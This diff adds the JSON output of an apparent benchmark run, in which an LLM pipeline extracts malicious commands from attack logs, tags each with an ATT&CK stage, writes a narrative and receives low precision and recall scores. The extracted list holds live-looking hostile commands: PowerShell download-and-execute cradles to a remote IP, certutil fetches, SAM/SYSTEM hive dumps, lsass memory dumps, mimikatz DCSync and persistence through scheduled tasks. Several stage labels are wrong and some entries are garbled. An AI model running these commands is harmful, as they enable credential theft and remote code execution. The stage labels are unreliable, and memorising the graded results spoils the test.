@@ -1,0 +1,179 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://124.223.85.207:8082/a'))\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Start-Process .\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /c \"",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/atomicredteam.hta C:\\tmp",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST'-UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C \"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd.exe /C \"cscript.exe  /e:VBScript.Encode T1059.007.vbs\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "cmd.exe /C \"schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "cmd.exe /C \"netsh advfirewall firewall add rule name=\"test\" dir=in protocol=tcp action=allow localport=80\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1134.001 -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "\"powershell.exe\" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "schtasks /delete /tn test /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "cmd.exe /C \"schtasks /create /tn test /tr c:\\test\\1053.005.bat /sc onlogon\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run\" /v test /t REG_SZ /d \"C:\\windows\\system32\\calc.exe\" /f",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "lazagne1.exe browsers",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\security c:\\users\\admini~1\\appdata\\local\\temp\\tjbvkjpetfjp",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\system c:\\users\\admini~1\\appdata\\local\\temp\\qsdirkg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "reg.exe save hklm\\sam c:\\users\\admini~1\\appdata\\local\\temp\\tthwwf",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "vssadmin.exe create shadow /for=c:",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "wmic /node:\"localhost\" shadowcopy call create Volume=C:\\",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "T1059.006.py",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "T1546.008 -TestNumbers 1 -Cleanup",
+        "stage": "Collection"
+      },
+      {
+        "command": "Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \"application/json\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "Invoke-PSImage -Script .\\Invoke-Mimikatz.ps1 -Out .\\evil-kiwi.png -Image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz.exe LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz2.exe lsadump::sam exit",
+        "stage": "Credential Access"
+      }
+    ],
+    "narrative": "The attackers initiated their campaign by exploiting PHPMyAdmin vulnerabilities to gain Initial Access. This led to an escalation with multiple attempts of Privilege Escalations, creation of Persistence mechanisms through scheduled tasks. Their next steps involved encoding a VBS script, adding rules to the Windows firewall, and creating a named pipe connection for remote command-and-control capabilities. Subsequently, they gathered sensitive information using Mimikatz, establishing Remote Desktop Protocol (RDP) connectivity, dumping LSASS memory, and accessing administrator accounts. Ultimately, they covered their tracks through various evasion techniques.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 86612,
+      "completion_tokens": 7168,
+      "total_tokens": 93780,
+      "wall_clock_s": 105.746,
+      "parse_retries": 1
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.1875,
+      "recall": 0.375,
+      "f1": 0.25,
+      "tp": 6,
+      "fp": 26,
+      "fn": 10
+    },
+    "stage": {
+      "precision": 0.0625,
+      "recall": 0.13333333333333333,
+      "f1": 0.0851063829787234,
+      "tp": 2,
+      "fp": 30,
+      "fn": 13,
+      "recall_partial": 0.17857142857142858
+    },
+    "hallucination_rate": 0.037037037037037035,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 86612,
+      "completion_tokens": 7168,
+      "total_tokens": 93780,
+      "wall_clock_s": 105.746,
+      "parse_retries": 1
+    }
+  },
+  "meta": {
+    "variant": "v4_triage",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true
+  }
+}
